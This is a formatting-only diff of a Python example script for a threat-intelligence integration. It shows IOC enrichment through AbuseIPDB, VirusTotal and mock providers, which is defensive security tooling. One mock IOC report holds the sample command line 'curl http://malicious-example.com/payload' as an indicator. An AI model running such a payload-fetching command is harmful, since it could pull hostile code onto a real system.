@@ -3,6 +3,7 @@ Example usage of threat intelligence integration.
 
 Demonstrates how to use the threat intelligence providers and IOC enricher.
 """
+
 import asyncio
 import logging
 from datetime import datetime
@@ -13,28 +14,26 @@ from analysis_engine.threat_intel import (
     VirusTotalProvider,
     MockThreatIntelProvider,
     IOCEnricher,
-    create_enricher_from_config
+    create_enricher_from_config,
 )
 from config import get_settings
 
 # Configure logging
 logging.basicConfig(
-    level=logging.INFO,
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
+    level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
 )
 logger = logging.getLogger(__name__)
 
 
 async def example_1_basic_provider_usage():
     """Example 1: Basic usage of individual providers."""
-    print("\n" + "="*70)
+    print("\n" + "=" * 70)
     print("Example 1: Basic Provider Usage")
-    print("="*70)
+    print("=" * 70)
 
     # Initialize cache
     cache_manager = CacheManager(
-        cache_dir="./data/threat_intel_cache",
-        default_ttl=3600
+        cache_dir="./data/threat_intel_cache", default_ttl=3600
     )
 
     # Use mock provider for testing without API keys
@@ -57,7 +56,9 @@ async def example_1_basic_provider_usage():
 
     # Check a file hash
     print("\n--- Checking File Hash ---")
-    hash_result = await provider.check_file_hash("d41d8cd98f00b204e9800998ecf8427e1234567890")
+    hash_result = await provider.check_file_hash(
+        "d41d8cd98f00b204e9800998ecf8427e1234567890"
+    )
     print(f"Hash: {hash_result['file_hash']}")
     print(f"Is Malicious: {hash_result['is_malicious']}")
     print(f"Threat Level: {hash_result['threat_level']}")
@@ -72,24 +73,23 @@ async def example_1_basic_provider_usage():
 
 async def example_2_real_providers():
     """Example 2: Using real providers (requires API keys)."""
-    print("\n" + "="*70)
+    print("\n" + "=" * 70)
     print("Example 2: Real Provider Usage (with API keys)")
-    print("="*70)
+    print("=" * 70)
 
     settings = get_settings()
 
     # Initialize cache
     cache_manager = CacheManager(
         cache_dir="./data/threat_intel_cache",
-        default_ttl=settings.threat_intel_cache_ttl
+        default_ttl=settings.threat_intel_cache_ttl,
     )
 
     # Initialize providers if API keys are available
     if settings.abuseipdb_api_key:
         print("\n--- Using AbuseIPDB ---")
         abuseipdb = AbuseIPDBProvider(
-            api_key=settings.abuseipdb_api_key,
-            cache_manager=cache_manager
+            api_key=settings.abuseipdb_api_key, cache_manager=cache_manager
         )
 
         # Check a known malicious IP (example)
@@ -105,8 +105,7 @@ async def example_2_real_providers():
     if settings.virustotal_api_key:
         print("\n--- Using VirusTotal ---")
         virustotal = VirusTotalProvider(
-            api_key=settings.virustotal_api_key,
-            cache_manager=cache_manager
+            api_key=settings.virustotal_api_key, cache_manager=cache_manager
         )
 
         # Check a domain
@@ -121,14 +120,13 @@ async def example_2_real_providers():
 
 async def example_3_ioc_enrichment():
     """Example 3: Enriching IOCs with the IOC Enricher."""
-    print("\n" + "="*70)
+    print("\n" + "=" * 70)
     print("Example 3: IOC Enrichment")
-    print("="*70)
+    print("=" * 70)
 
     # Initialize cache
     cache_manager = CacheManager(
-        cache_dir="./data/threat_intel_cache",
-        default_ttl=3600
+        cache_dir="./data/threat_intel_cache", default_ttl=3600
     )
 
     # Create mock provider for testing
@@ -139,15 +137,12 @@ async def example_3_ioc_enrichment():
         providers=[mock_provider],
         cache_manager=cache_manager,
         max_concurrent_requests=10,
-        batch_size=50
+        batch_size=50,
     )
 
     # Enrich a single IOC
     print("\n--- Enriching Single IOC ---")
-    single_result = await enricher.enrich_ioc(
-        ioc_type="ip",
-        ioc_value="192.168.1.100"
-    )
+    single_result = await enricher.enrich_ioc(ioc_type="ip", ioc_value="192.168.1.100")
     print(f"IOC: {single_result['ioc_value']}")
     print(f"Type: {single_result['ioc_type']}")
     print(f"Providers Queried: {single_result['providers_queried']}")
@@ -157,7 +152,7 @@ async def example_3_ioc_enrichment():
     print("\n--- Enriching Multiple IOCs (Batch) ---")
     iocs_to_enrich = {
         "ip": ["192.168.1.100", "10.0.0.1", "172.16.0.1"],
-        "domain": ["malicious-example.com", "safe-example.com"]
+        "domain": ["malicious-example.com", "safe-example.com"],
     }
 
     batch_results = await enricher.enrich_iocs_batch(iocs_to_enrich)
@@ -167,14 +162,16 @@ async def example_3_ioc_enrichment():
         print(f"\n{ioc_type.upper()}s:")
         for ioc in enriched_iocs:
             assessment = ioc.get("threat_assessment", {})
-            print(f"  - {ioc['ioc_value']}: {assessment.get('overall_threat_level', 'unknown')}")
+            print(
+                f"  - {ioc['ioc_value']}: {assessment.get('overall_threat_level', 'unknown')}"
+            )
 
 
 async def example_4_ioc_report_enrichment():
     """Example 4: Enriching a full IOC report."""
-    print("\n" + "="*70)
+    print("\n" + "=" * 70)
     print("Example 4: IOC Report Enrichment")
-    print("="*70)
+    print("=" * 70)
 
     # Create mock IOC report (as would be generated by IOC extractor)
     mock_ioc_report = {
@@ -182,18 +179,22 @@ async def example_4_ioc_report_enrichment():
             "ip_addresses": ["192.168.1.100", "10.0.0.1", "172.16.0.1"],
             "domains": ["malicious-example.com", "safe-example.com"],
             "principals": ["admin@example.com"],
-            "command_lines": ["curl http://malicious-example.com/payload"]
+            "command_lines": ["curl http://malicious-example.com/payload"],
         },
         "severity_classified": {
             "critical": [],
             "high": [
-                {"type": "principal", "value": "admin@example.com", "reason": "Compromised account"}
+                {
+                    "type": "principal",
+                    "value": "admin@example.com",
+                    "reason": "Compromised account",
+                }
             ],
             "medium": [],
-            "low": []
+            "low": [],
         },
         "summary": "Extracted 6 indicators of compromise from session",
-        "generation_method": "template"
+        "generation_method": "template",
     }
 
     # Initialize enricher
@@ -215,16 +216,20 @@ async def example_4_ioc_report_enrichment():
         print(f"\n  {ioc_type.upper()}:")
         for enrichment in enrichments:
             assessment = enrichment.get("threat_assessment", {})
-            print(f"    - {enrichment['ioc_value']}: "
-                  f"threat={assessment.get('overall_threat_level', 'unknown')}, "
-                  f"malicious={assessment.get('is_malicious', False)}")
+            print(
+                f"    - {enrichment['ioc_value']}: "
+                f"threat={assessment.get('overall_threat_level', 'unknown')}, "
+                f"malicious={assessment.get('is_malicious', False)}"
+            )
 
     print("\nThreat Summary:")
     summary = enriched_report.get("threat_summary", {})
     print(f"  Total IOCs Enriched: {summary.get('total_iocs_enriched', 0)}")
     print(f"  Malicious IOCs: {summary.get('malicious_iocs', 0)}")
     print(f"  Overall Risk Level: {summary.get('overall_risk_level', 'unknown')}")
-    print(f"  Requires Immediate Attention: {summary.get('requires_immediate_attention', False)}")
+    print(
+        f"  Requires Immediate Attention: {summary.get('requires_immediate_attention', False)}"
+    )
 
     print("\nEnrichment Metadata:")
     metadata = enriched_report.get("enrichment_metadata", {})
@@ -234,9 +239,9 @@ async def example_4_ioc_report_enrichment():
 
 async def example_5_config_based_setup():
     """Example 5: Using config-based enricher setup."""
-    print("\n" + "="*70)
+    print("\n" + "=" * 70)
     print("Example 5: Config-Based Enricher Setup")
-    print("="*70)
+    print("=" * 70)
 
     settings = get_settings()
 
@@ -269,9 +274,9 @@ async def example_5_config_based_setup():
 
 async def example_6_integration_with_ioc_extractor():
     """Example 6: Integration with IOC Extractor Agent."""
-    print("\n" + "="*70)
+    print("\n" + "=" * 70)
     print("Example 6: Integration with IOC Extractor Agent")
-    print("="*70)
+    print("=" * 70)
 
     from analysis_engine.agents.ioc_extractor_agent import IocExtractorAgent
     from analysis_engine.core.parser import NormalizedEvent
@@ -286,7 +291,7 @@ async def example_6_integration_with_ioc_extractor():
         llm_provider=None,
         use_llm=False,
         threat_intel_enricher=enricher,
-        enable_enrichment=True
+        enable_enrichment=True,
     )
 
     # Create mock events for testing
@@ -300,7 +305,7 @@ async def example_6_integration_with_ioc_extractor():
             status="success",
             source_ip="192.168.1.100",
             user_agent="aws-cli/2.0",
-            metadata={"suspicious": True}
+            metadata={"suspicious": True},
         ),
         NormalizedEvent(
             timestamp=datetime.utcnow(),
@@ -311,15 +316,13 @@ async def example_6_integration_with_ioc_extractor():
             status="success",
             source_ip="192.168.1.100",
             user_agent="aws-cli/2.0",
-            metadata={"suspicious": True}
-        )
+            metadata={"suspicious": True},
+        ),
     ]
 
     # Create correlation session
     session = CorrelationSession(
-        session_id="test-session-001",
-        start_time=datetime.utcnow(),
-        events=mock_events
+        session_id="test-session-001", start_time=datetime.utcnow(), events=mock_events
     )
 
     # Extract and enrich IOCs
@@ -338,23 +341,27 @@ async def example_6_integration_with_ioc_extractor():
             print(f"\n  {ioc_type}:")
             for enrichment in enrichments:
                 assessment = enrichment.get("threat_assessment", {})
-                print(f"    - {enrichment['ioc_value']}: "
-                      f"{assessment.get('overall_threat_level', 'unknown')}")
+                print(
+                    f"    - {enrichment['ioc_value']}: "
+                    f"{assessment.get('overall_threat_level', 'unknown')}"
+                )
 
         print("\nThreat Summary:")
         summary = ioc_report.get("threat_summary", {})
         print(f"  Overall Risk: {summary.get('overall_risk_level', 'unknown')}")
         print(f"  Malicious IOCs: {summary.get('malicious_iocs', 0)}")
-        print(f"  Immediate Attention Required: {summary.get('requires_immediate_attention', False)}")
+        print(
+            f"  Immediate Attention Required: {summary.get('requires_immediate_attention', False)}"
+        )
     else:
         print("\nNo threat intelligence enrichment performed")
 
 
 async def main():
     """Run all examples."""
-    print("\n" + "="*70)
+    print("\n" + "=" * 70)
     print("THREAT INTELLIGENCE INTEGRATION - EXAMPLES")
-    print("="*70)
+    print("=" * 70)
 
     try:
         # Example 1: Basic provider usage
@@ -375,9 +382,9 @@ async def main():
         # Example 6: Integration with IOC extractor
         await example_6_integration_with_ioc_extractor()
 
-        print("\n" + "="*70)
+        print("\n" + "=" * 70)
         print("All examples completed successfully!")
-        print("="*70)
+        print("=" * 70)
 
     except Exception as e:
         logger.error(f"Error running examples: {e}", exc_info=True)
